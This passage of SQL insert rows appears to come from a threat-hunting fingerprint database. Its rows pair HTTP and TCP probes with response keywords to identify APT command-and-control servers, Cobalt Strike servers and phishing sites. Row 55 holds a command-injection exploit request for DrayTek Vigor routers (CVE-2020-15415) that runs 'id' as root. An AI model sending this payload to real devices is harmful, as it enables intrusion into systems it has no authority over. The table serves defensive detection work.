	(54, 'TW方向毒云藤钓鱼网站', 'APT-C-01', '钓鱼网站', 'HTTP', 'keyword', 'GET / HTTP/1.1\\r\\nConnection: close\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\\r\\nCache-Control: no-cache\\r\\nPragma: no-cache\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/115.0.1901.200\\r\\n\\r\\n', '<title>网易邮箱超大附件下载', '', '2023-08-11 14:48:00', '2023-09-08 03:27:55', 1, 0),
	(55, 'VN方向海莲花C2跳板Vigor路由器漏洞2', '路由器漏洞', 'CVE-2020-15415', 'HTTP', 'keyword', 'POST /cgi-bin/mainfunction.cgi/cvmcfgupload?1=2 HTTP/1.1\\r\\nCache-Control: max-age=0\\r\\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\\r\\nAccept-Language: zh,en;q=0.9,zh-CN;q=0.8,la;q=0.7\\r\\nContent-Length: 161\\r\\nConnection: close\\r\\n\\r\\n------WebKitFormBoundary\\r\\nContent-Disposition: form-data; name="abc"; filename="t\';id;echo \'123_"\\r\\nContent-Type: text/x-python-script\\r\\n\\r\\n------WebKitFormBoundary', 'uid=0(root)', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(56, 'APT28-代码特征', 'APT28', 'C2', 'HTTP', 'keyword', 'GET /n/tiF2/b.ktx HTTP/1.1\\r\\nHost: cdnverify.net\\r\\nConnection: keep-alive\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept-Language: en-US,en;q=0.9\\r\\n\\r\\n', 'must-revalidate', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(57, 'Bitter-代码特征-3', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /tstRsdvgiMincSnyYutspph/tstPerHyPfilbmiwts2t.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(58, 'Bitter-PsehestyvuPw-3', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /PsehestyvuPw/F1l3estPhPInf2.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(59, 'APT29-木马托管服务器', 'APT29', '跳板', 'HTTP', 'keyword', 'GET /files/setups/tweaking.com_windows_repair_aio_setup.exe HTTP/1.1\\r\\n\\r\\n', 'MZ', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(60, 'LatsRo-木马指纹', 'APT-C-01', 'C2', 'TCP', 'keyword', '', '4155674F000000000000', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(61, 'StrongPity-代码特征', 'PROMETHIUM', 'C2', 'HTTP', 'keyword', 'GET /sys.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(62, 'APT-C-53-代码片段', 'APT-C-53', 'C2', 'HTTP', 'keyword', 'GET /DESKTOP-HI4IBR6/intercourse/intense.mdl HTTP/1.1\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; ms-office; MSOffice 14)\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: Keep-Alive\\r\\n\\r\\n', 'Apache/2.4.38 (Debian)', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(63, 'QQ钓鱼网站', '钓鱼网站', '钓鱼网站', 'HTTP', 'keyword', 'GET / HTTP/1.1\\r\\nConnection: close\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\\r\\nCache-Control: no-cache\\r\\nPragma: no-cache\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.200\\r\\n\\r\\n', '请输入你的QQ密码', '', '2023-08-11 10:30:48', '2023-09-08 03:27:55', 1, 0),
	(64, 'Bitter-代码特征-2', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /PsehestyvuPw/F1l3estPhPInf1.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(65, 'Lazarus-端口服务', 'Lazarus Group', 'C2', 'HTTP', 'keyword', 'GET /phpmyadmin/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 403 Forbidden', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(66, 'Bitter-代码特征', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /ourtyaz/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(67, 'SideWinder-代码特征', '响尾蛇', 'C2', 'HTTP', 'keyword', 'GET /images/1/2/3/4/5 HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', '<h1>404 Not Found</h1>', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(68, 'SideWinder-6path', 'APT-C-35', 'C2', 'HTTP', 'keyword', 'GET /1/2/3/4/5/6 HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Encoding: gzip, deflate\\r\\nConnection: close\\r\\n\\r\\n', '<pre>Cannot GET /1/2/3/4/5/6</pre>', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(69, 'Bitter-代码特征-2', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /RguhsT/accept.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(70, '毒云藤-gh0st木马', 'APT-C-01', 'C2', 'TCP', 'keyword', '46574b4a47fa0000', '00 00 00 00 00 00', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(71, 'SideWinder-代码特征-6', '响尾蛇', 'C2', 'HTTP', 'keyword', 'GET /1/2/3/4/5/6 HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', '<pre>Cannot GET /1/2/3/4/5/6</pre>', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(72, 'Bitter-代码特征-3', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /RsdvgiMincSnyYu/PerHyPfilbmiw2.php HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(73, 'APT组织载荷工具-CobaltStrike-4', '载荷工具', '载荷、工具', 'HTTP', 'keyword', 'GET /manager/text/list/ HTTP/1.1\\r\\nConnection: close\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\\r\\nCache-Control: no-cache\\r\\nPragma: no-cache\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/115.0.1901.200\\r\\n\\r\\n', 'HTTP/1.1 200 OK && application/octet-stream', '', '2023-08-11 18:10:38', '2023-09-08 03:27:55', 1, 0),
	(74, 'Bitter-代码特征-1', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /PsehestyvuPw/ HTTP/1.1\nUser-Agent: Mozilla/5.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Encoding: gzip, deflate\nConnection: close', 'HTTP/1.1 200 OK\n<span>Password', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(75, 'KR方向钓鱼雀钓鱼网站', '钓鱼雀', '钓鱼网站', 'HTTP', 'keyword', 'GET / HTTP/1.1\\r\\nConnection: close\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\r\\nAccept-Encoding: gzip, deflate\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\\r\\nCache-Control: no-cache\\r\\nPragma: no-cache\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/115.0.1901.200\\r\\n\\r\\n', '网易免费邮-你的专业电子邮局</title && /163_files/', '', '2023-08-11 15:35:42', '2023-09-08 03:27:55', 1, 0),
	(76, 'Bitter_代码特征', 'BITTER', 'C2', 'HTTP', 'keyword', 'GET /autolan.php HTTP/1.1\nCache-Control: max-age=0\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.26 (KHTML, like Gecko) Chrome/91.0.4718.131 Safari/527.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/\nConnection: close', '200 and blank page', '', '2022-06-21 17:52:27', '2023-09-08 03:27:55', 1, 0),
	(77, 'MuddyWater-代码特征', 'MuddyWater', 'C2', 'HTTP', 'keyword', 'GET /wp-content/upgrade/editor.php?ac=1&n=admin:USER-PC:USER-PC:Windows%20(32-bit)%20NT%206.01 HTTP/1.1\\r\\nConnection: Keep-Alive\\r\\nAccept: */*\\r\\nAccept-Language: en-us\\r\\nUser-Agent: Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)\\r\\n\\r\\n', 'IHDR', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(78, '肚脑虫-节点指纹', 'Donot', 'C2', 'TCP', 'keyword', '000000000000', '4e534d566559714d376a6237533133417769344c4f762f75636759675358534b6d702b2b4a45595263415a576e76494959725944724d5858764a4a44624171427a746d386f766c5353446a6663416c7237486c4f676b363832317a6e624c61336e6d3632326a5a70626846576f725357754848344b644839496f2b6d585239356c43754d36756366316c39726971414b77556732314f456c5746764d396d56653447726e55587076512f454b6f6b2b704d355332627372415258426c4f30674b7a58357564654c586d4655335334324649434a47735771396e362b4c4738624a4b59464e586330667a6c413d', '', '2022-06-21 17:52:26', '2023-09-08 06:07:12', 1, 0),
	(79, 'Patchwork-代码特征', '摩诃草', 'C2', 'HTTP', 'keyword', 'POST //e3e7e71a0b28b5e96cc492e636722f73//4sVKAOvu3D//BDYot0NxyG.php HTTP/1.1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101\\r\\nAccept: application/x-www-form-urlencoded\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nCache-Control: no-cache\\r\\nContent-Length: 202\\r\\n\\r\\n', 'success', '', '2022-06-21 17:52:26', '2023-09-08 03:27:55', 1, 0),
	(80, 'CobaltStrike-默认证书', '载荷工具', '载荷、工具', 'HTTP', 'cert', 'GET /manager/text/list/ HTTP/1.1\\r\\nConnection: close\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\\r\\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6\\r\\nCache-Control: no-cache\\r\\nPragma: no-cache\\r\\nUpgrade-Insecure-Requests: 1\\r\\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/115.0.1901.200\\r\\n\\r\\n', 'cert_issuer_o:cobaltstrike', '', '2023-08-11 18:10:38', '2023-10-12 06:14:55', 1, 0);
